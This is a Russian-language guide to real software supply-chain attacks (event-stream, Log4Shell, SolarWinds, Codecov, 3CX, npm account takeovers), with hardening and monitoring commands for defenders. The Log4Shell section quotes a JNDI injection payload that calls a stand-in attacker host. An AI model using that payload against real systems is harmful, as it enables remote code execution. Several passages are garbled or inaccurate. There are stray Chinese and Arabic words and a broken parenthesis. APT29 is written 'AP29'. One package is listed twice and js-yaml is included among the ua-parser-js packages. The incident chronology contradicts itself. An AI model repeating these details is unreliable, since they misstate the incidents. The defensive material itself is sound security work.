# Примеры реальных атак на цепочку поставок

**Актуально для:** SLSA v1.2, Cosign v3.1.3, Trivy ≥ 0.71.0, Syft v1.54+, Grype v0.82+, CycloneDX 1.7, SPDX 3.0, Kubernetes 1.31+ (для admission control), eBPF-based runtime monitoring (Falco/Tetragon)

## Определения

* **Supply Chain Attack (Атака на цепочку поставок):** Класс атак, при которых злоумышленник компрометирует не само приложение, а один из элементов его жизненного цикла: зависимость, инструмент сборки, CI/CD-пайплайн, реестр артефактов или учётную запись мейнтейнера. Цель — внедрение бэкдора или кражи данных через легитимный канал обновления.
* **Backdoor (Бэкдор):** Скрытый механизм обхода аутентификации или выполнения произвольного кода, встроенный в легитимный программный продукт.
* **Typosquatting (Тайпосквоттинг):** Публикация вредоносного пакета с именем, отличающимся на 1–2 буквы от популярного (например, `colors.js` vs `colour.js`), в расчёте на опечатку при установке.
* **Maintainer Takeover (Захват учётной записи):** Получение контроля над популярным open-source проектом через социальную инженерию, компрометацию аккаунта или покупку прав на поддержку.
* **Dependency Confusion (Подмена зависимостей):** Публикация вредоносного пакета с именем внутреннего приватного пакета в публичном реестре с более высокой версией, что приводит к установке вредоносного пакета вместо внутреннего.

## Основные концепции

### Классификация атак по вектору

| Вектор | Примеры атак | Как обнаружить |
|:--- |:--- |:--- |
| **Зависимости (пакетные менеджеры)** | event-stream, colors.js/ua-parser.js, Log4Shell | SCA-сканирование, SBOM, аудит зависимостей |
| **CI/CD пайплайны** | Codecov, SolarWinds (оркестрация), 3CX | Аудит конфигов CI, проверка webhook'ов, ephemeral runners |
| **Учётные записи мейнтейнеров** | ua-parser.js, colors.js | Мониторинг смены владельцев, аудит npm/GitHub |
| **Базовые образы** | Криптомайнеры в Docker Hub образах | Сканирование образов, digest pinning |
| **Инструменты сборки/обновления** | SolarWinds Orion | Проверка целостности инструментов, SLSA provenance |

## Предпосылки

### Программное обеспечение

* **Управление зависимостями:** npm 10+, pip 24+ (с `--require-hashes`), Maven 3.9+, Gradle 8.5+ с включённым `dependencyLocking`.
* **Сканирование образов:** Trivy ≥ 0.71.0, Grype v0.82+, Syft v1.54+.
* **Подпись и верификация артефактов:** Cosign v3.1.3 (Keyless через Sigstore или внутренний Fulcio/Rekor).
* **Runtime наблюдаемость:** Falco (eBPF) 0.38+ или Cilium Tetragon 0.14+ для обнаружения аномальной загрузки библиотек.
* **Контроль доступа:** Kyverno v1.19+ с ImageValidatingPolicy для проверки SLSA provenance на этапе deployment.
* **Реестр артефактов:** Harbor v2.15+ с поддержкой OCI 1.1 Referrers API для хранения аттестаций.

### Требования к среде

* **Egress control:** CI/CD раннеры работают в изолированных сетях с явно разрешённым egress только к доверенным реестрам и API-сервисам.
* **Hardware:** процессоры с поддержкой AES-NI для ускорения TLS в инфраструктуре подписи; 8–16 ГБ ОЗУ для локального сканирования больших образов.
* **Хранилище журналов:** централизованный сбор логов CI/CD ( Loki + Promtail или syslog-ng) для корреляции подозрительных egress-соединений.

## Практические сценарии

### 1. event-stream (npm, 2018)

**Что произошло:** Злоумышленник получил право на поддержку популярной библиотеки `event-stream` (2 млн загрузок/неделю) и добавил зависимость `flatmap-stream`, содержащую бэкдор, нацеленный на кражу приватных ключей из Bitcoin-кошелька Copay.

**Хронология:**
1. Мейнтейнер `event-stream` передал права новому участнику (social engineering / усталость).
2. Новый мейнтейнер добавил `flatmap-stream` как зависимость.
3. Бэкдор был зашифрован и активировался только в среде Copay.
4. Украдено ~2 млн долларов в Bitcoin.

**Как защититься:**
- **Lock-файлы:** `npm ci` вместо `npm install` — установка строго по lock-файлу.
- **Аудит зависимостей:** `npm audit`, Trivy/Grype для проверки новых зависимостей.
- **Мониторинг смены владельцев:** Отслеживание `npm owner` для критичных пакетов.
- **SBOM:** Генерация SBOM для каждого релиза для быстрой идентификации затронутых версий.

```bash
# Проверка владельцев пакета
npm owner ls event-stream
# → Если появился новый владелец без истории — подозрительно

# Аудит на CVE
npm audit --audit-level=moderate
```

### 2. colors.js / ua-parser.js (npm, 2021–2022)

**Что произошло:** Мейнтейнер Marak Squires намеренно повредил собственные библиотеки `colors.js` (6 млн загрузок/неделю) и `faker.js` ( добавив бесконечный цикл с выводом `LIBERTY LIBERTY LIBERTY` и обфусцированный код. Позже `ua-parser.js` был скомпрометирован через захват аккаунта — в пакет добавлен скрипт для кражи криптовалюты.

**Механизм:**
- `colors.js` v1.4.1: намеренная порча (protestware) — мейнтейнер выражал недовольство отсутствием оплаты за open-source.
- `ua-parser.js`: захват аккаунта через компрометацию электронной почты, добавление вредоносного скрипта в `postinstall`.

**Как защититься:**
- **Фиксация версий:** Не использовать `^` или `~` для критичных зависимостей.
- **Lock-файлы:** `npm ci` с проверкой integrity.
- **Пининг по digest:** Для npm — `package-lock.json` с `resolved` URL и `integrity` хешем.
- **Мониторинг аномалий:** Отслеживание изменений в `postinstall`-скриптах.

```json
// package-lock.json — проверка integrity
{
  "dependencies": {
    "ua-parser-js": {
      "version": "0.7.33",
      "resolved": "https://registry.npmjs.org/ua-parser-js/-/ua-parser-js-0.7.33.tgz",
      "integrity": "sha512-..."
    }
  }
}
```

```bash
# Проверка: все пакеты из ожидаемого реестра
npm ls --json | jq '.[] | .resolved' | grep -v "registry.npmjs.org" && echo "ALERT: unexpected registry"
```

### 3. Log4Shell (Log4j, CVE-2021-44228, 2021)

**Что произошло:** Уязвимость в Java-библиотеке `log4j` (CVSS 10.0) позволяла удалённое выполнение кода (RCE) через specially crafted строку в логах. Затронуты миллионы приложений по всему миру.

**Механизм:** JNDI-инъекция через `${jndi:ldap://attacker.com/exploit}` в любой строке, которая попадает в лог (User-Agent, URL, заголовки). Log4j выполнял JNDI-lookup и загружал вредоносный класс с удалённого сервера.

**Почему это supply chain атака:** Log4j — транзитивная зависимость тысяч Java-приложений. Разработчики не знали, что используют уязвимую библиотеку (она была подтянута через Spring, Struts, Elasticsearch и т.д.).

**Как защититься:**
- **SBOM:** Генерация SBOM для Java-приложений (Maven/Gradle) для быстрого поиска затронутых артефактов.
- **SCA-сканирование:** Trivy/Grype для обнаружения Log4j в образах.
- **Emergency patching:** Обновление до Log4j 2.17.1+ или удаление `JndiLookup.class`.
- **Митигация:** Установка свойства `log4j2.formatMsgNoLookups=true`.

```bash
# Поиск Log4j в Docker-образах
trivy image my-java-app:latest --vuln CVE-2021-44228
# → Log4j 2.14.1 — CRITICAL

# Удаление уязвимого класса (временная мера)
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```

### 4. SolarWinds Orion (2020)

**Что произошло:** Группа APT (AP29/NOBELIUM) скомпрометировала процесс сборки SolarWinds Orion, внедрив бэкдор (SUNBURST) в легитимный обновлённый пакет. Скомпрометированы ~18 000 организаций (включая правительство США).

**Хронология:**
1. Злоумышленник получил доступ к инфраструктуре сборки SolarWinds.
2. Модифицирован исходный код Orion SolarWinds при сборке (build-time injection).
3. Скомпрометированный пакет (SolarWinds.Orion.Core.BusinessLayer.dll) был подписан валидным сертификатом.
4. Пакет распространялся через легитимный канал обновлений SolarWinds.
5. Бэкдор активировался через 2 недели после установки иcommunicate с C2-сервером через DNS.

**Ключевой урок:** Подпись артефакта не гарантирует безопасность, если скомпрометирована среда сборки. Подпись подтверждает, что «SolarWinds собрал это», но не гарантирует, что сборка была чистой.

**Как защититься:**
- **SLSA Build L3:** Аппаратная изоляция сборки (Intel TDX / AMD SEV-SNP).
- **Reproducible Builds:** Независимая пересборка для подтверждения идентичности артефакта.
- **Provenance аттестации:** Проверка не только подписи, но и provenance (где, кем, из какого кода собрано).
- **Supply Chain Observability:** GUAC для анализа графа зависимостей и быстрого определения blast radius.
- **Network monitoring:** Обнаружение аномальных DNS-запросов (SUNBURSTcommunicate через DNS).

```bash
# Проверка provenance артефакта (Cosign v3.1.3)
cosign verify-attestation --type slsaprovenance harbor.internal/orion:v2024.1 \
  --certificate-identity-regexp "https://solarwinds.internal/build" \
  --certificate-oidc-issuer "https://solarwinds.internal" \
  | jq '.payload | fromjson | .verified'
# → Проверяется, что артефакт собран в доверенной среде с указанным provenance
```

### 5. Codecov Bash Uploader (2021)

**Что произошло:** Злоумышленник скомпрометировал Docker-образ Codecov, модифицировав `codecov bash uploader` для экспорта переменных окружения (включая секреты CI) на внешний сервер.

**Механизм:**
1. Модифицирован легитимный Docker-образ Codecov.
2. Скрипт `codecov.sh` (подключаемый в CI) был изменён для перехвата переменных окружения.
3. Секреты (AWS ключи, токены реестров, приватные ключи) отправлялись на скомпрометированный сервер.
4. Атака длилась ~2 месяца до обнаружения.

**Как защититься:**
- **Digest pinning:** Фиксация образов по digest, а не по тегу.
- **Скрипты по хеш-суммам:** Проверка целостности скачиваемых скриптов перед выполнением.
- **OIDC вместо статических секретов:** Краткосрочные токены вместо долгоживущих ключей.
- **Сетевой контроль:** Ограничение исходящих соединений с раннеров (firewall, NetworkPolicy).

```bash
# Проверка хеш-суммы скачиваемого скрипта
curl -sSL https://codecov.io/bash | sha256sum
# → Сверка с эталонным хешем из официальной документации

# Вместо pipe — скачать и проверить
curl -sSL -o codecov.sh https://codecov.io/bash
echo "expected_hash  codecov.sh" | sha256sum -c -
# → codecov.sh: OK
```

### 6. 3CX Desktop App (2023)

**Что произошло:** Вредоносный код был внедрён в легитимный дистрибутив 3CX Desktop App (VoiP-клиента с 600 000 клиентов) через скомпрометированный процесс сборки. Атака была связана с группой Lazarus (Северная Корея).

**Механизм:**
1. Предыдущая компрометация (внешняя зависимость 3CX) привела к доступу к процессу сборки.
2. Вредоносный код (аутентификатор) был добавлен в легитимный пакет.
3. Пакет был подписан валидным сертификатом 3CX.
4. При установке загружался дополнительныйpayload для кражи данных.

**Как защититься:**
- **SLSA Provenance:** Проверка не только подписи, но и provenance аттестации.
- **Runtime drift detection:** Обнаружение динамической загрузки библиотек (eBPF/Falco).
- **SBOM:** Быстрая идентификация затронутых компонентов.
- **Network segmentation:** Ограничение доступа приложений изолированными сегментами.

### 7. ua-parser.js (npm, 2021)

**Что произошло:** Аккаунт мейнтейнера `ua-parser-js` (8 млн загрузок/неделю) был скомпрометирован. В пакеты `ua-parser-js`, `ua-parser-js` и `js-yaml` добавлены вредоносные скрипты для майнинга криптовалюты и кражи данных.

**Механизм:** Социальная инженерия / компрометация электронной почты мейнтейнера → захват аккаунта npm → публикация вредоносных версий.

**Как защититься:**
- **2FA для мейнтейнеров:** Обязательная двухфакторная аутентификация.
- **Автоматические алерты:** Уведомления при публикации новой версии критичных зависимостей.
- **Lock-файлы:** Фиксация версий, `npm ci` для воспроизводимой установки.

## Лучшие практики

1. **Defense in Depth:** Никакая单一 мера не защитит от всех атак. Используйте комбинацию: lock-файлы + SBOM + сканирование + подписи + admission control.
2. **SBOM для быстрого реагирования:** При обнаружении новой CVE — за минуты определите, какие сервисы затронуты.
3. **Automated dependency updates:** Renovate/Dependabot с SCA-гейтами для автоматического обновления с проверкой безопасности.
4. **Digest pinning:** Фиксируйте образы по digest, а не по тегу. Теги изменяемы, digest — нет.
5. **Reproducible Builds:** Для критичных систем — возможность независимой пересборки артефакта для подтверждения целостности.
6. **Network segmentation:** Ограничьте исходящие соединения раннеров CI/CD. Скрипты не должны обращаться к произвольным внешним серверам.
7. **Аудит ownership:** Мониторинг смены владельцев критичных пакетов в npm/PyPI/crates.io.

## Устранение неполадок

| Симптом | Причина | Решение |
|:--- |:--- |:--- |
| Новая версия зависимости содержит аномалии | Аккаунт мейнтейнера скомпрометирован | Откатите на предыдущую версию, проверьте SBOM, создайте VEX |
| CI/CD пайплайн обращается к неизвестным внешним адресам | Возможна атака на цепочку поставок | Блокируйте egress, проверьте скрипты на وجود encoded payload |
| SBOM не содержит ожидаемых компонентов | Syft не распознал экосистему | Используйте `cdxgen` как fallback |
| Критичная CVE в транзитивной зависимости | Ложноположительное срабатывание | Проверьте reachability, создайте VEX `not_affected` |

## Граничные случаи и ограничения

* **Protestware:** Намеренная порча пакета мейнтейнером (colors.js) — не обнаруживается SCA-сканерами, так как пакет технически «валиден». Защита — пининг версий и аудит changelog.

* **Внутренние атаки:** SolarWinds показал, что скомпрометирована может быть даже среда сборки. Только reproducible builds и hardware isolation (SLSA L3) дают гарантию.

* **Транзитивные зависимости:** Log4Shell показал, что уязвимость может скрываться на глубине 3–4 уровня в дереве зависимостей. Только SBOM с reachability analysis позволяет быстро оценить impact.

### SRE runbook: реакция на компрометацию maintainer-аккаунта

Когда мейнтейнер критичного пакета (например, `ua-parser.js`) публикует подозрительную версию:

1. **Немедленно:** отключить автоматические обновления через Renovate/Dependabot для этого пакета (emergency policy).
2. **Идентифицировать затронутые сервисы:** построить reverse-dependency graph через Dependency-Track или GUAC.
3. **Срочная проверка:** запустить Trivy + Grype со scan-by-SBOM для всех затронутых образов.
4. **Создать VEX:** опубликовать CycloneDX VEX с `not_affected` для сервисов, где уязвимый код не достижим (подтверждённый reachability analysis).
5. **Откатить:** если VEX нельзя выпустить — откатить на проверенную версию и увеличить версию lock-файла принудительно.

### Sysadmin: egress monitoring через eBPF

Атаки типа 3CX и Codecov Bash Uploader используют runtime загрузку библиотек и обращение к C2 через DNS/HTTPS. Локальные системные администраторы могут обнаружить такие атаки через:

```bash
# Falco — мониторинг подозрительной загрузки библиотек (ptrace, dlopen)
# → Alert при: openat + интерпретируемый файл + неизвестный remote IP

# Tetragon — отслеживание syscall execve с неизвестных бинарных путей
kubectl exec -n tetragon ds/tetragon -- \
  tetra getevents -s execve -k 'binary=/usr/bin/python3' --follow

# sysdig — поиск аномального DNS traffic от CI/CD runner'ов
sysdig -pc 'evt.type=dns and fd.net != "10.0.0.0/8"' \
  | grep -i 'suspicious-domain'
```

**Настройка syslog-ng для egress-логов CI runner'ов:**

```bash
# /etc/syslog-ng/conf.d/ci-egress.conf
source s_ci_runner {
  iptables(prefix("ci-egress."));
};
filter f_egress {
  netmask(10.0.0.0/8, { inverse(true); });
};
destination d_alert {
  file("/var/log/ci-egress-alerts.log");
};
log { source(s_ci_runner); filter(f_egress); destination(d_alert); };
```

### DevOps: проверка скриптов перед выполнением в CI

Во многих атаках (Codecov, 3CX) злоумышленники модифицируют удалённые скрипты, которые вызываются через `curl | bash`. Защита на уровне CI/CD:

```yaml
# .gitlab-ci.yml — проверка скрипта перед исполнением
before_script:
  - curl -sSL https://example.com/install.sh -o install.sh
  - echo "sha256:expected_hash_here  install.sh" | sha256sum -c -
  # → install.sh: OK (или FAIL → pipeline aborts)
```
